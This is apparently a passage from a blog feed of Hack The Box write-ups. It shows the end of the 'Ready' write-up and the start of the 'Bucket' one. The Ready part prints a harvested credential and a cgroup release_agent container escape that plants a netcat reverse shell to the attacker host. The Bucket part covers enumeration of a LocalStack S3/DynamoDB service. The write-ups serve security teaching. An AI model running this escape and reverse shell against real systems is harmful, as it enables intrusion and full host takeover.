&lt;p&gt;Performing an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grep&lt;/code&gt; search on it looking for passwords (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;passwd&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwd&lt;/code&gt;), found an entry that called attention on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/backup/gitlab.rb&lt;/code&gt;, as we can see in the output below, after removing commented and blank lines.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git@gitlab:/opt/backup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /opt/backup/gitlab.rb | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Ev&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'^#|^$'&lt;/span&gt;
gitlab_rails[&lt;span class=&quot;s1&quot;&gt;'smtp_password'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;wW59U!ZKMbG9+*#h&quot;&lt;/span&gt;
git@gitlab:/opt/backup&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With this credential, tested it for the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; and succeeded, but in root’s home path &lt;strong&gt;there was no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root.txt&lt;/code&gt;&lt;/strong&gt;, indicating that we’ll need to escape the container to obtain the root’s flag.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git@gitlab:/opt/backup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su root
Password:
root@gitlab:/opt/backup# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /root
total 28
drwx------ 1 root root 4096 Feb 27 13:24 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 1 root root 4096 Dec  1 12:41 ..
lrwxrwxrwx 1 root root    9 Dec  7 16:56 .bash_history -&amp;gt; /dev/null
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root 3106 Oct 22  2015 .bashrc
drwxr-xr-x 2 root root 4096 Feb 27 13:24 .nano
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root  148 Aug 17  2015 .profile
drwx------ 2 root root 4096 Dec  7 16:49 .ssh
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt; 1 root root 1565 Dec 13 15:06 .viminfo
root@gitlab:/opt/backup#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;escaping-container&quot;&gt;Escaping container&lt;/h3&gt;

&lt;p&gt;Once we have privileged access inside the container, if it is running under specific circunstancies, we can escape to the host as was very well documented in this blog post &lt;a href=&quot;https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/&quot;&gt;Understanding Docker container escapes | Trail of Bits Blog&lt;/a&gt;, found after some research in this scenario.&lt;/p&gt;

&lt;p&gt;Following the step-by-step described on it, created a listener in 4443 TCP in attacker machine and executed the following steps using root privileges, obtaining this way a reverse shell.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# In the container&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; /tmp/cgrp &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; mount &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; cgroup &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; rdma cgroup /tmp/cgrp &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; /tmp/cgrp/x
 
&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;1 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/cgrp/x/notify_on_release
&lt;span class=&quot;nv&quot;&gt;host_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/.*\perdir=\([^,]*\).*/\1/p'&lt;/span&gt; /etc/mtab&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$host_path&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/cmd&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/cgrp/release_agent
 
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#!/bin/sh'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /cmd
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.10.10 4443 &amp;gt;/tmp/f&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /cmd
&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;a+x /cmd
 
sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;echo &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &amp;gt; /tmp/cgrp/x/cgroup.procs&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the received connection, confirmed that we were in the host running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker ps&lt;/code&gt; command and then obtained the root flag.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 4443
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 4443 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.136] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.220] 38246
/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# docker ps
CONTAINER ID        IMAGE                          COMMAND             CREATED             STATUS                 PORTS                                   NAMES
7eb263389e5e        gitlab/gitlab-ce:11.4.7-ce.0   &quot;/assets/wrapper&quot;   2 months ago        Up 5 hours (healthy)   22/tcp, 443/tcp, 0.0.0.0:5080-&amp;gt;80/tcp   docker-gitlab_web_1
# cat /root/root.txt
&amp;lt;redacted&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I hope you guys have enjoyed.&lt;/p&gt;

&lt;p&gt;See you in the next post! :smile:&lt;/p&gt;</content><author><name>Davi Cruz</name></author><category term="Writeup" /><category term="HackTheBox" /><category term="htb-medium" /><category term="htb-linux" /><summary type="html">Hello guys! This week’s machine will be Ready, another median-rated machine from Hack The Box, created by bertolis.</summary></entry><entry><title type="html">Hackthebox write-up: Bucket</title><link href="https://davicruz.com/writeup/2021/04/htb-bucket/" rel="alternate" type="text/html" title="Hackthebox write-up: Bucket" /><published>2021-04-24T09:00:00-03:00</published><updated>2021-04-24T09:00:00-03:00</updated><id>https://davicruz.com/writeup/2021/04/htb-bucket</id><content type="html" xml:base="https://davicruz.com/writeup/2021/04/htb-bucket/">&lt;p&gt;Hello guys!&lt;/p&gt;

&lt;p&gt;This week’s machine will be &lt;strong&gt;Bucket&lt;/strong&gt;, another median-rated machine from &lt;a href=&quot;https://www.hackthebox.eu/&quot;&gt;Hack The Box&lt;/a&gt;, created by &lt;a href=&quot;https://app.hackthebox.eu/users/13531&quot;&gt;MrR3boot&lt;/a&gt;. &lt;!--more--&gt;&lt;/p&gt;

&lt;p class=&quot;notice--info&quot;&gt;:information_source: &lt;strong&gt;Info&lt;/strong&gt;: Write-ups for Hack The Box machines are posted as soon as they’re retired.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/Qp79TCm.png&quot; alt=&quot;HTB Bucket&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Solving this box was pretty cool, where I had the opportunity to “play” a little with AWS storage services, even being in a local instance normally used by developers.&lt;/p&gt;

&lt;p&gt;Its resolution was closely linked to this service, where we had to identify a way to include a file on the published website to get a reverse shell and later the user flag with the credentials harvested during enumeration.&lt;/p&gt;

&lt;p&gt;Root flag was obtained after abuse of an application still under development, where we used a vulnerable code to get an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; key and thus gain interactive shell as root.&lt;/p&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;

&lt;p&gt;As usual, we start with a quick &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan, to identify the services currently published on this machine:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; quick 10.10.10.212
Nmap 7.91 scan initiated Fri Feb 26 08:16:37 2021 as: nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; quick 10.10.10.212
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.212
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.077s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Did not follow redirect to http://bucket.htb/
Service Info: Host: 127.0.1.1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Nmap done at Fri Feb 26 08:16:48 2021 -- 1 IP address (1 host up) scanned in 10.55 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;80tcp---serviço-http&quot;&gt;80/TCP - Serviço HTTP&lt;/h3&gt;

&lt;p&gt;Once I have noticed a redirect to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bucket.htb&lt;/code&gt;, I have modified the local hosts file to map this hostname to the box IP address.&lt;/p&gt;

&lt;p&gt;After accessing the website, as none of the images were loaded figured out after a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; call that they were pointing to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s3.bucket.htb&lt;/code&gt;, which was later added to local host file as well.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; http://bucket.htb | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Eo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'href=&quot;.*&quot;|src=&quot;.*&quot;'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  5344  100  5344    0     0  33822      0 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- 33822
&lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;#&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;#&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;i &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;fab fa-facebook-square&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;#&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;i &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;fab fa-instagram&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;#&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;i &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;fab fa-linkedin&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;#&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;i &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;fab fa-twitter&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://s3.bucket.htb/adserver/images/bug.jpg&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;alt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Bug&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;160&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;160&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://s3.bucket.htb/adserver/images/cloud.png&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;alt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;cheer&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;160&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;160&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://s3.bucket.htb/adserver/images/malware.png&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;alt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Malware&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;160&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;160&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;s3buckethtb&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s3.bucket.htb&lt;/code&gt;&lt;/h4&gt;

&lt;p&gt;After identifying the DNS &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s3.bucket.htb&lt;/code&gt; instantly made the link of S3 with &lt;a href=&quot;https://aws.amazon.com/s3&quot;&gt;Amazon S3&lt;/a&gt;, a cloud service which provides blob storage.&lt;/p&gt;

&lt;p&gt;Checking the webserver of the request, noticed that for one of image URLs the webserver that answered the request was different from Apache seen in nmap scan (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hypercorn-h11&lt;/code&gt;), which means that there’s some kind of proxy or a different webserver answering the request for this virtual host.&lt;/p&gt;

&lt;p&gt;To understand what we have in this structure, I have started a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; enumeration and have found two interesting directories: &lt;em&gt;health&lt;/em&gt; and &lt;em&gt;shell&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; gobuster-s3.txt
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
Gobuster v3.0.1
by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@_FireFart_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url:            http://s3.bucket.htb
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:        10
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Status codes:   200,204,301,302,307,401,403
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent:     gobuster/3.0.1
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:        10s
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
2021/02/26 09:42:22 Starting gobuster
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
/health &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/shell &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Progress: 2643 / 220561 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.20%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Is important to notice that these are directories and not pages, once the result of the web request as seen in curl below is different if the slash (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;) is present in the end or not:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; http://s3.bucket.htb/health                                                                       
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;services&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;s3&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;running&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;dynamodb&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;running&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}}&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; http://s3.bucket.htb/health/
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;status&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;running&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;                                                                                                 
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; http://s3.bucket.htb/shell


&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; http://s3.bucket.htb/shell/
&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE html&amp;gt;
&amp;lt;html itemscope &lt;span class=&quot;nv&quot;&gt;itemtype&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://schema.org/Product&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
  &amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
    &amp;lt;title&amp;gt;AWS Console&amp;lt;/title&amp;gt;
    &amp;lt;meta &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;

    &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; Application &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As the last request (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl -L http://s3.bucket.htb/shell/&lt;/code&gt;) returned a HTML page, I’ve retried it using browser and noticed that I was accessing &lt;strong&gt;DynamoDB Web Shell&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Researching a little about this service I could determine it is a storage emulator for AWS, possibly a &lt;a href=&quot;https://github.com/localstack/localstack&quot;&gt;Localstack&lt;/a&gt;, very popular between developers.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/6J27Miv.png&quot; alt=&quot;DynamoDB Web Shell - Bucket HTB&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Playing with some samples on the page, I was able to get some information about the existing tables (ListTables e DescribeTable), as below, where I could identify some information like the region (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;us-east-1&lt;/code&gt;) and a table called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;users&lt;/code&gt;, as well as its respective resource name &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;arn:aws:dynamodb:us-east-1:000000000000:table/users&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/cKIzAtd.png&quot; alt=&quot;DynamoDB Web Shell - List - Bucket HTB&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Considering we’re talking about a LocalStack instance, I have found that would be possible to use &lt;a href=&quot;https://aws.amazon.com/cli&quot;&gt;awscli&lt;/a&gt;, aws command line interface utility, to connect to this service, as described on the following post &lt;a href=&quot;https://reflectoring.io/aws-localstack/&quot;&gt;Local Development with AWS on LocalStack (reflectoring.io)&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;As &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;awscli&lt;/code&gt; is more flexible to enumerate and work with resources than DynamoDB Web Shell, I have installed it using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apt&lt;/code&gt; and connected to it using the information obtained in the post mentioned above. For credentials, any value can be used, once it isn’t a true AWS service.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Install aws cli&lt;/span&gt;
